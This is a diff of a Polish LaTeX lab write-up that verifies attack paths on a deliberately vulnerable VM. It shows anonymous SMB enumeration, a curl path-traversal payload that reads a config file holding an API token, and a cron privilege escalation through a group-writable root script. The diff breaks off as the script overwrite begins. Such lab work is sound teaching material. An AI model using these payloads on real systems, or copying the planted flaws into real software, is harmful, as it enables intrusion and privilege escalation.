@@ -23,13 +23,27 @@ PORT     STATE    SERVICE     VERSION
 $ smbclient -N -L //192.168.56.101/
         Sharename       Type      Comment
         ---------       ----      -------
-        public          Disk      VulnBox Public Deployment Documents
+        public          Disk      VulnBox Public Deployment Notes
 
 $ smbclient -N //192.168.56.101/public -c "get deployment-notes.txt -"
-VulnBox Internal Deployment Notes (Revision 2026.04)
-- Web diagnostics portal deployed on port 8080 (/var/www/vulnbox/index.php).
-- Internal management API bound strictly to loopback (127.0.0.1:5000).
-- Service token stored in /opt/internal_api/config.ini (header: X-Internal-Token).
+========================================================================
+VulnBox - Internal Deployment Notes (Draft v1.2)
+========================================================================
+Host:              vulnbox
+Service Account:   dev
+Web Portal (:8080): /var/www/vulnbox/index.php (?module=status)
+Diagnostics View:   /?log=<filename> (logs dir: /var/log/webapp/)
+Internal Bridge:    /?proxy_path=<endpoint>&token=<tok>
+
+Internal Services:
+- Loopback Flask API binds strictly to 127.0.0.1:5000 (systemd: flask-internal)
+- Service configuration and API token stored in:
+  /opt/internal_api/config.ini
+- Scheduled maintenance scripts located in /opt/admin/
+
+Reminder:
+Remove this draft file from /srv/samba/public before production handover.
+========================================================================
 \end{lstlisting}
 
 Jak wynika z listingu \ref{lst:e2e-stage1}, port \texttt{5000/tcp} jest poprawnie blokowany z zewnątrz przez zaporę UFW (\texttt{filtered}), natomiast zasób \texttt{//192.168.56.101/public} pozwala na anonimowe pobranie pliku \texttt{deployment-notes.txt}, który ujawnia lokalizację plików \texttt{/var/www/vulnbox/index.php} oraz \texttt{/opt/internal\_api/config.ini}.
@@ -46,6 +60,12 @@ $ curl -s "http://192.168.56.101:8080/?module=status"
 === VulnBox Diagnostics Portal ===
 Service: vulnbox-web (Nginx + PHP-FPM)
 Status: ONLINE
+Base Log Directory: /var/log/webapp/
+Internal API Bridge: http://127.0.0.1:5000
+Usage:
+  ?module=status                     - Display service health summary
+  ?log=<filename>                    - View diagnostic log from /var/log/webapp/
+  ?proxy_path=<endpoint>&token=<tok> - Query local management API on 127.0.0.1:5000
 
 $ curl -s "http://192.168.56.101:8080/?log=....//....//....//opt/internal_api/config.ini"
 [VulnBox Log Viewer] Requested path: /var/log/webapp/../../../opt/internal_api/config.ini
@@ -54,8 +74,10 @@ $ curl -s "http://192.168.56.101:8080/?log=....//....//....//opt/internal_api/co
 name = vulnbox-internal-api
 bind_host = 127.0.0.1
 bind_port = 5000
+environment = lab-verification
 
 [security]
+# Static token required in X-Internal-Token header for /api/v1/* endpoints
 api_token = vb-internal-9f8e7d6c5b4a3f2e1d0c
 target_account = dev
 authorized_keys_path = /home/dev/.ssh/authorized_keys
@@ -95,11 +117,11 @@ Z poziomu sesji SSH użytkownika \texttt{dev} zweryfikowano obie zaprojektowane 
 \subsection{Ścieżka A: Zadanie cykliczne Cron i skrypt z uprawnieniami grupy dev}
 \label{subsec:sciezka-a-cron}
 
-Inspekcja zawartości katalogu \path{/opt/admin/hooks/} oraz pliku konfiguracyjnego \path{/etc/cron.d/vulnbox-maintenance} potwierdziła, że skrypt \path{/opt/admin/hooks/pre_backup.sh} posiada uprawnienia \texttt{0775} i grupę \texttt{dev}. Dopisanie do niego polecenia diagnostycznego skutkuje jego automatycznym wykonaniem przez demona \texttt{cron} w kolejnej minucie w kontekście \texttt{root}.
+Inspekcja zawartości katalogu \path{/opt/admin/hooks/} oraz pliku konfiguracyjnego \path{/etc/cron.d/vulnbox-maintenance} potwierdziła, że skrypt \path{/opt/admin/hooks/pre_backup.sh} posiada uprawnienia \texttt{0775} i grupę \texttt{dev}. Nadpisanie jego zawartości w miejscu (z zachowaniem bitu wykonywalności sprawdzanego przez \texttt{backup\_check.sh}) skutkuje automatycznym wykonaniem polecenia przez demona \texttt{cron} w kolejnej minucie w kontekście \texttt{root}.
 
 \begin{lstlisting}[language=bash, caption={Weryfikacja ścieżki zadaniowej cron (pre\_backup.sh) z poziomu konta dev}, label={lst:e2e-stage4a}]
 dev@vulnbox:~$ ls -la /opt/admin/hooks/pre_backup.sh
--rwxrwxr-x 1 root dev 188 Nov 22 12:00 /opt/admin/hooks/pre_backup.sh
+-rwxrwxr-x 1 root dev 106 Nov 22 12:00 /opt/admin/hooks/pre_backup.sh
 
 dev@vulnbox:~$ cat << 'EOF' > /opt/admin/hooks/pre_backup.sh
 #!/usr/bin/env bash
